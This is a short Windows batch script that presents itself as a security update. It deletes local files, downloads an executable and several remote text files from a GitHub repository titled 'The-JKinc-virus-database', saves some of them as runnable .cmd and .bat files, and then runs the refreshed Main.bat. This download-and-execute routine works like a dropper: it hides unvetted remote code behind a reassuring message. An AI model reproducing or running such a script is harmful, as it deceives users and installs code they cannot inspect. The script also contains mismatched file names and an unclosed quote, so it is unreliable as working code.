@echo off

echo please wait while we update your security

echo Updating Rules

del .\chat_main.exe
del .\RepairPC.cmd
del .\Rules-websites.txt

echo downloading chat_program
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://github.com/JKincorperated/The-JKinc-virus-database/raw/main/client.exe', 'chat_main.exe')"
echo downloading Repair_PC
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://raw.githubusercontent.com/JKincorperated/The-JKinc-virus-database/main/Rules-General.txt', 'RepairPC.cmd')"
echo downloading rule 3
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://raw.githubusercontent.com/JKincorperated/The-JKinc-virus-database/main/Rules-websites.txt', 'memegen.bat')"

echo Updating Main Software

del Main.bat

powershell -Command "(New-Object Net.WebClient).DownloadFile('http://raw.githubusercontent.com/JKincorperated/The-JKinc-virus-database/main/Main.bat', 'Main.bat')

del version.txt

Main.bat